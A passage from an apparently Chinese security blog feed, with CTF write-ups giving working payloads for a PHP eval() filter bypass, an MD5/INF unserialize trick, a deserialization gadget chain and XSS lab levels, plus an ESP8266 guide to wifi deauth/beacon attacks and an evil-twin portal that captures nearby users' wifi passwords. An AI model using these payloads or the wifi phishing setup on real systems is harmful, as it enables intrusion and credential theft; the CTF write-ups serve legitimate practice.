class="string">&#x27;base_convert&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($danger <span class="keyword">as</span> $val)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($s,$val) !==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;很抱歉，执行出错，发现危险字符【&#x27;</span>.$val.<span class="string">&#x27;】&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^[a-z]$/i&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;很抱歉，执行出错，发现危险字符&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parserIfLabel</span>(<span class="params"> $content </span>) </span>&#123;</span><br><span class="line">    $pattern = <span class="string">&#x27;/\&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;/&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match_all( $pattern, $content, $matches ) ) &#123;</span><br><span class="line">        $count = count( $matches[ <span class="number">0</span> ] );</span><br><span class="line">        <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $count; $i++ ) &#123;</span><br><span class="line">            $flag = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            $out_html = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            $ifstr = $matches[ <span class="number">1</span> ][ $i ];</span><br><span class="line">            $ifstr=danger_key($ifstr,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(strpos($ifstr,<span class="string">&#x27;=&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">                $arr= splits($ifstr,<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">                <span class="keyword">if</span>($arr[<span class="number">0</span>]==<span class="string">&#x27;&#x27;</span> || $arr[<span class="number">1</span>]==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;很抱歉，模板中有错误的判断,请修正【&#x27;</span>.$ifstr.<span class="string">&#x27;】&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $ifstr = str_replace( <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;==&#x27;</span>, $ifstr );</span><br><span class="line">            &#125;</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;&lt;&gt;&#x27;</span>, <span class="string">&#x27;!=&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;||&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;&amp;&amp;&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;mod&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, $ifstr );</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">&#x27;/\&#123;|&#125;/&#x27;</span>, $ifstr)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;很抱歉，模板中有错误的判断,请修正&#x27;</span>.$ifstr);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                @<span class="keyword">eval</span>( <span class="string">&#x27;if(&#x27;</span> . $ifstr . <span class="string">&#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;</span> );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">&#x27;/([\s\S]*)?\&#123;else\&#125;([\s\S]*)?/&#x27;</span>, $matches[ <span class="number">2</span> ][ $i ], $matches2 ) ) &#123;</span><br><span class="line">                <span class="keyword">switch</span> ( $flag ) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;if&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">1</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">1</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;else&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">2</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">2</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ( $flag == <span class="string">&#x27;if&#x27;</span> ) &#123;</span><br><span class="line">                $out_html .= $matches[ <span class="number">2</span> ][ $i ];</span><br><span class="line">            &#125;</span><br><span class="line">            $pattern2 = <span class="string">&#x27;/\&#123;if([0-9]):/&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( $pattern2, $out_html, $matches3 ) ) &#123;</span><br><span class="line">                $out_html = str_replace( <span class="string">&#x27;&#123;if&#x27;</span> . $matches3[ <span class="number">1</span> ], <span class="string">&#x27;&#123;if&#x27;</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">&#x27;&#123;else&#x27;</span> . $matches3[ <span class="number">1</span> ] . <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&#123;else&#125;&#x27;</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">&#x27;&#123;end if&#x27;</span> . $matches3[ <span class="number">1</span> ] . <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&#123;end if&#125;&#x27;</span>, $out_html );</span><br><span class="line">                $out_html = <span class="keyword">$this</span>-&gt;parserIfLabel( $out_html );</span><br><span class="line">            &#125;</span><br><span class="line">            $content = str_replace( $matches[ <span class="number">0</span> ][ $i ], $out_html, $content );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">splits</span>(<span class="params"> $s, $str=<span class="string">&#x27;,&#x27;</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>( $s ) ) <span class="keyword">return</span> <span class="keyword">array</span>( <span class="string">&#x27;&#x27;</span> );</span><br><span class="line">    <span class="keyword">if</span> ( strpos( $s, $str ) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> explode( $str, $s );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>( $s );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看到<code>parserIfLabel</code>函数里的正则</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>[\s\S]</code>表示通配，看到后面有一个<code>eval</code>函数，尝试是否可以写进函数。</p>
<p>这里随便试一下可以发现，这个正则式可以匹配的。</p>
<img src="http://img.kawhi.xyz/image-20200821150736049.png" alt="image-20200821150736049" style="high:80%;width:80%;" />

<p>这里在本地测试把<code>danger_key</code>过滤函数去掉之后发现，再传<code>phpinfo</code></p>
<p>直接出现<code>phpinfo()</code>的页面</p>
<img src="http://img.kawhi.xyz/image-20200821093807478.png" alt="image-20200821093807478" style="high:80%;width:80%;" />

<p>然后就是绕过<code>danger_key</code>，这里过滤php以及一些函数等等，尝试用异或构造字符。</p>
<p>异或构造<code>phpinfo()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="string">&#x27;4:49:R9&#x27;</span>^<span class="string">&#x27;DRDPT4V&#x27;</span>)()//phpinfo()</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://eci-2zebqdx3ky4mu3qy28yg.cloudeci1.ichunqiu.com/?a=&#123;if:%20(%274:49:R9%27^%27DRDPT4V%27)()&#125;()&#123;end%20%20%20if&#125;</span><br></pre></td></tr></table></figure>

<p>直接在phpinfo里面发现flag。</p>
<h2 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a><strong>easytrick</strong></h2><p>源码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;你太长了&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">unserialize($_GET[<span class="string">&#x27;trick&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>这里发现需要<code>$trick1</code>和<code>$trick2</code>不相等，但是md5值相等的强绕过，还限制了长度不能超过5，而且<code>$trick1</code>被转为了<code>string</code>，数组绕过发现不可行。</p>
<p>这里就是两个不同类型的变量，一个<code>float</code>，一个<code>string</code>，在做比较时不相等，在md5处理时相等。这里可以用php的INF（无穷大）。</p>
<p>构造序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1=<span class="number">1</span>/<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $trick2=<span class="number">1</span>/<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> trick();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2zei1qumnps7gku8ou0x.cloudeci1.ichunqiu.com&#x2F;?trick&#x3D;O:5:%22trick%22:2:&#123;s:6:%22trick1%22;d:INF;s:6:%22trick2%22;d:INF;&#125;</span><br></pre></td></tr></table></figure>

<p>回显看到flag。</p>
<h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a><strong>babyunserialize</strong></h2><p>WMCTF的链，改改就能用了：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Cursor</span>  <span class="title">implements</span> \<span class="title">IteratorAggregate</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">CLI</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Agent</span> &#123;</span><br><span class="line">        <span class="title">protected</span>  $<span class="title">server</span>=&quot;&quot;;</span><br><span class="line">        <span class="keyword">public</span> $events;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events=[<span class="string">&quot;disconnect&quot;</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="string">&quot;&quot;</span>)),<span class="string">&quot;find&quot;</span>)];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server=<span class="keyword">$this</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Mapper</span> <span class="title">extends</span> \<span class="title">DB</span>\<span class="title">Cursor</span>&#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            $<span class="title">props</span>=[&quot;<span class="title">quotekey</span>&quot;=&gt;&quot;<span class="title">phpinfo</span>&quot;],</span><br><span class="line">            $<span class="title">adhoc</span>=[-1=&gt;[&quot;<span class="title">expr</span>&quot;=&gt;&quot;<span class="title">kawi</span>&quot;]],</span><br><span class="line">            $<span class="title">db</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span>(<span class="params">$offset</span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span>(<span class="params">$offset</span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span>(<span class="params">$offset, $value</span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span>(<span class="params">$offset</span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getIterator</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$val</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = $val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">array</span>(<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">WS</span>(),<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">Agent</span>())));</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://eci-2ze0y4x958n38d0jl6pv.cloudeci1.ichunqiu.com/?flag=a%3A2%3A%7Bi%3A0%3BO%3A6%3A%22CLI%5CWS%22%3A0%3A%7B%7Di%3A1%3BO%3A9%3A%22CLI%5CAgent%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00server%22%3Br%3A3%3Bs%3A6%3A%22events%22%3Ba%3A1%3A%7Bs%3A10%3A%22disconnect%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A13%3A%22DB%5CSQL%5CMapper%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00props%22%3Ba%3A1%3A%7Bs%3A8%3A%22quotekey%22%3Bs%3A7%3A%22phpinfo%22%3B%7Ds%3A8%3A%22%00%2A%00adhoc%22%3Ba%3A1%3A%7Bi%3A-1%3Ba%3A1%3A%7Bs%3A4%3A%22expr%22%3Bs%3A4%3A%22kawi%22%3B%7D%7Ds%3A5%3A%22%00%2A%00db%22%3BO%3A13%3A%22DB%5CSQL%5CMapper%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00props%22%3Ba%3A1%3A%7Bs%3A8%3A%22quotekey%22%3Bs%3A7%3A%22phpinfo%22%3B%7Ds%3A8%3A%22%00%2A%00adhoc%22%3Ba%3A1%3A%7Bi%3A-1%3Ba%3A1%3A%7Bs%3A4%3A%22expr%22%3Bs%3A4%3A%22kawi%22%3B%7D%7Ds%3A5%3A%22%00%2A%00db%22%3Bs%3A0%3A%22%22%3B%7D%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure>

<p>flag在phpinfo里面。</p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
  <entry>
    <title>esp8266制作wifi杀手及wifi钓鱼</title>
    <url>/2020/03/04/esp8266%E5%88%B6%E4%BD%9Cwifi%E6%9D%80%E6%89%8B%E5%8F%8Awifi%E9%92%93%E9%B1%BC/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h4><p>esp8266是一块带自带wifi模块的Arduino，上传代码可以使用烧录工具，同时他还支持Arduino 开发环境编程。这里用esp8266做别人已经写好的wifi杀手和wifi钓鱼。还有千万要注意不要乱攻击别人的wifi，自己测试玩玩就好。</p>
<h4 id="wifi杀手"><a href="#wifi杀手" class="headerlink" title="wifi杀手"></a><strong>wifi杀手</strong></h4><p>所需材料：</p>
<ul>
<li>esp8266一块</li>
<li>一根安卓数据线</li>
<li>wifi杀手固件及烧录固件的软件</li>
</ul>
<h5 id="烧录固件"><a href="#烧录固件" class="headerlink" title="烧录固件"></a><strong>烧录固件</strong></h5><p>先下载烧录的工具，在烧录之前先ERASE擦除一下原来的数据，选好端口(COM)和波特率(BAUD),然后把提前下载好的固件烧录进去即可。</p>
<img src="http://img.kawhi.xyz/image-20200302201605251.png" alt="image-20200302201605251" style="high:30%;width:30%;" />

<h5 id="进入后台"><a href="#进入后台" class="headerlink" title="进入后台"></a><strong>进入后台</strong></h5><p>在烧录进去之后需要按一下板子的RST</p>
<p>然后可以看到自己的WIFI列表多了名为zhangguangzhang的wifi账号，密码同WIFi账号。连接之后进入192.168.4.1。</p>
<img src="http://img.kawhi.xyz/image-20200302203452958.png" alt="image-20200302203452958" style="high:80%;width:100%;" />

<p>这里我选择了beacon攻击，几秒钟后板子附近的wifi都改成了你想改的名字。</p>
<p><img src="http://img.kawhi.xyz/image-20200302204350279.png" alt="image-20200302204350279" style="high:30%;width:30%;" /><img src="http://img.kawhi.xyz/image-20200302203524575.png" alt="image-20200302203524575" style="high:30%;width:30%;" /></p>
<p>停止攻击即可恢复如初，不用担心改不回来。</p>
<p>里面还有其他功能，可以自己尝试一下有什么效果。</p>
<p>所需要的固件和工具在百度都能找到</p>
<h4 id="wifi钓鱼"><a href="#wifi钓鱼" class="headerlink" title="wifi钓鱼"></a><strong>wifi钓鱼</strong></h4><p>所需材料：</p>
<ul>
<li>esp8266一块</li>
<li>一根安卓数据线</li>
<li>wifi钓鱼固件及烧录固件的软件</li>
</ul>
<h5 id="烧录固件-1"><a href="#烧录固件-1" class="headerlink" title="烧录固件"></a><strong>烧录固件</strong></h5><p>首先将wifi钓鱼的固件烧录进去板子</p>
<img src="http://img.kawhi.xyz/image-20200405213955923.png" alt="image-20200405213955923" style="high:30%;width:30%;" />

<h5 id="进入后台-1"><a href="#进入后台-1" class="headerlink" title="进入后台"></a><strong>进入后台</strong></h5><p>我这里用的固件是别人写好的wifi钓鱼固件。烧录好之后重启一下板子。再wifi列表会多出一个wifi。</p>
<p>wifi名称：FishAP，密码：gkdamm666。</p>
<p>然后连接上wifi，再在你的浏览器输入<a href="http://192.168.0.1/backdoor.html">http://192.168.0.1/backdoor.html</a></p>
<img src="http://img.kawhi.xyz/QQ%E6%88%AA%E5%9B%BE20200405193017.png" style="high:50%;width:50%;"/>

<p>可以看到附近的wifi列表，选择通用型，再输入编号。按确认即可开始钓鱼。</p>
<h5 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a><strong>获取密码</strong></h5><p>这时候被钓鱼的wifi会连接不上，并且这时候我们板子的wifi(FishAP)的名字会伪装成被钓鱼wifi的名字。板子的蓝灯会开始常亮。</p>
<p>然后被钓鱼的手机会连上我们伪造的wifi,然后继续会弹出我们钓鱼后台(192.168.0.1)，如图</p>
<img src="http://img.kawhi.xyz/wifi123.png" alt="image-wifi123" style="high:50%;width:50%;" />

<p>当然，这时候他是上不了网的，如果他输入了wifi密码的话，钓鱼就成功了。在按升级完毕之后，我们的板子的灯会灭，说明已经成功的获取密码了。</p>
<p>这时候再重新连接我们板子的wifi(FishAP)。即可看到钓鱼的密码。</p>
<img src="http://img.kawhi.xyz/QQ%E6%88%AA%E5%9B%BE20200405211928.jpg" style="high:60%;width:60%;" />]]></content>
      <categories>
        <category>硬件</category>
      </categories>
  </entry>
  <entry>
    <title>esp8266连接显示器</title>
    <url>/2020/03/21/esp8266%E8%BF%9E%E6%8E%A5%E6%98%BE%E7%A4%BA%E5%99%A8/</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h5><p>**简介:**本篇文章展示用OLED显示屏与ESP8266连接。OLED淘宝上一般有两种，4引脚(IIC)和7引脚(SPI)，7引脚的屏幕就稍微大点。这里我用的是4引脚。接线如下所示。基本就3.3接vcc，gnd地线接地线没有问题，引用角D1(GPIO5)，D2(GPIO4)接SLC和SDA。</p>
<p><strong>价格：</strong>一个esp8266和oled显示器加起来也就20块左右。</p>
<img src="http://img.kawhi.xyz/image-20200321115923891.png" alt="image-20200321115923891" style="high:40%;width:40%;" />

<h5 id="基本显示"><a href="#基本显示" class="headerlink" title="基本显示"></a><strong>基本显示</strong></h5><p><strong>输出hello world！</strong></p>
<p>首先要装一个U8g2的库，然后只需要短短10多行代码即可显示。</p>
<img src="http://img.kawhi.xyz/image-20200321104619926.png" alt="image-20200321104619926" style="high:80%;width:80%;" />

<p><strong>输出动画</strong></p>
<p>项目代码：<a style="text-decoration:none;" class="foo" href="https://github.com/icomgx/esp8266_codePlayer" target="_blank">传送门</a></p>
<p>这个项目是用python特殊处理了你的视频，原理大概是把视频切成很多帧图片，然后因为oled无法显示彩色视频，所以需要把图片灰度化，然后再进行转码，这样视频就可以在显示器上逐帧播放你的视频了。</p>
<video width="320" height="200" controls="controls">
  <source src="http://img.kawhi.xyz/QQ%E8%A7%86%E9%A2%9120200321123849.mp4" type="video/mp4" />
</video>


<h5 id="显示电脑情况"><a href="#显示电脑情况" class="headerlink" title="显示电脑情况"></a><strong>显示电脑情况</strong></h5><img src="http://img.kawhi.xyz/image-20200320212053043.png" alt="image-20200320212053043" style="high:80%;width:80%;" />

<p>项目代码：<a style="text-decoration:none;" class="foo" href="https://github.com/flyAkari/AIDA64Reader" target="_blank">传送门</a></p>
<p>所需工具：AIDA64，Arduino的u8g2库。</p>
<p>在AIDA64把下图都勾选上，再把代码上传到esp8266板子上即可。</p>
<img src="http://img.kawhi.xyz/image-20200320212408242.png" alt="image-20200320212408242" style="high:80%;width:80%;" />


<h5 id="显示北京时间"><a href="#显示北京时间" class="headerlink" title="显示北京时间"></a><strong>显示北京时间</strong></h5><img src="http://img.kawhi.xyz/image-20200321102945702.png" alt="image-20200321102945702" style="high:80%;width:80%;" />

<p>项目代码：<a style="text-decoration:none;" class="foo" href="https://github.com/flyAkari/ESP8266_Network_Clock" target="_blank">传送门</a></p>
<p>这个项目是使用的烧录工具直接上传的，免去了搭建环境的麻烦。</p>
<h5 id="显示实时肺炎疫情"><a href="#显示实时肺炎疫情" class="headerlink" title="显示实时肺炎疫情"></a><strong>显示实时肺炎疫情</strong></h5><img src="http://img.kawhi.xyz/image-20200321113448668.png" alt="image-20200321113448668" style="high:80%;width:80%;" />

<p>项目代码：<a style="text-decoration:none;" class="foo" href="https://gitee.com/ikcty/pneumonia" target="_blank">传送门</a></p>
<p>这里需要装一个Arduinojson库，同时需要运行代码里面的python服务端。代码里面具体怎么实现我就没有去研究了。</p>
<p>可以显示累计治愈数，现有确诊，现有疑似，累计死亡数。每一分钟更新一次数据。每个数据显示15秒。</p>
]]></content>
      <categories>
        <category>硬件</category>
      </categories>
  </entry>
  <entry>
    <title>XSS闯关小游戏</title>
    <url>/2020/04/29/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h5><p>练习一下xss。平台地址为：<a style="text-decoration:none;" class="foo" href="http://test.ctf8.com/" target="_blank">传送门</a></p>
<h5 id="level1"><a href="#level1" class="headerlink" title="level1"></a><strong>level1</strong></h5><p>没有任何过滤，直接给name传值，<strong>payload：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="http://img.kawhi.xyz/image-20200429170941592.png" alt="image-20200429170941592" style="high:80%;width:80%;" />

<p>源代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str = $_GET[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;欢迎用户&quot;</span>.$str.<span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h5 id="level2"><a href="#level2" class="headerlink" title="level2"></a><strong>level2</strong></h5><p>源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.$str.<span class="string">&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<p>h2标签被<code>htmlspecialchars</code>函数转义了，导致无法执行xss。</p>
<p>但是发现有input框，这里使用闭合双引号就可以正常弹窗。</p>
<p><strong>payload:</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></span><br><span class="line"><span class="string">&quot;</span> onclick=<span class="string">&quot;alert(/xss/)</span></span><br><span class="line"><span class="string">&quot;</span> onclick=alert(/xss/)&gt;</span><br><span class="line"><span class="string">&quot; onmouseover=alert(/xss/)&gt;</span></span><br><span class="line">&quot;&gt;&lt;a href=javascript:alert(/xss/)&gt;go&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h5 id="level3"><a href="#level3" class="headerlink" title="level3"></a><strong>level3</strong></h5><p>源代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&quot;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&#x27;&quot;</span>.htmlspecialchars($str).<span class="string">&quot;&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里两个地方都转义了，&lt;&gt;会被转义。闭合单引号，使用事件弹窗。</p>
<p><strong>payload:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=alert(/xss/)//</span></span><br><span class="line"><span class="string">&#x27;</span> onclick=<span class="string">&#x27;alert(/xss/)</span></span><br></pre></td></tr></table></figure>

<h5 id="level4"><a href="#level4" class="headerlink" title="level4"></a><strong>level4</strong></h5><p>源代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str2=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str2);</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.$str3.<span class="string">&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到尖括号被替换为空了。</p>
<p><code>onfocus</code>事件：定义的事件将在对象获得焦点时触发，auto自动获得焦点。</p>
<p><strong>payload:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; onclick=&quot;</span>alert(<span class="regexp">/xss/</span>)</span><br><span class="line"><span class="string">&quot; onfocus=alert(/xss/) autofocus=&quot;</span></span><br></pre></td></tr></table></figure>

<h5 id="level5"><a href="#level5" class="headerlink" title="level5"></a><strong>level5</strong></h5><p>源代码：</p>
